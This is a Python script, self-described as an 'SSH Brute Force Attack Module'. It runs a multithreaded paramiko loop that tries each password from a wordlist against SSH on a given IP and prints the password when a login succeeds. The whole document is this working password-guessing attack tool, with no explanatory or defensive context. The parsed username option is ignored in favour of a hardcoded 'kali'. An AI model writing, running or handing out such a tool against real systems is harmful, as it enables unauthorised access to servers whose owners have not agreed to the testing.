import paramiko
import argparse
from concurrent.futures import ThreadPoolExecutor
from threading import Event

stop_event = Event()

def attempt(ip, pwd):
    if stop_event.is_set():
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, username='kali', password=pwd.strip(), timeout=3, allow_agent=False, look_for_keys=False)

    except paramiko.ssh_exception.AuthenticationException:
        pass

    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Connection failed")

    except Exception:
        pass

    else:
        print(f"Password found: {pwd.strip()}")
        stop_event.set()

    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Attack Module")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("-u", "--username", default="kali")
    parser.add_argument("-p", "--passwords", default="ssh_passwords.txt")

    args = parser.parse_args()

    with open(rf'{args.passwords}', 'r') as passwords:
        with ThreadPoolExecutor(max_workers=100) as ex:
            for pwd in passwords:
                if stop_event.is_set():
                    break

                ex.submit(attempt, args.ip, pwd)

if __name__ == "__main__":
    main()
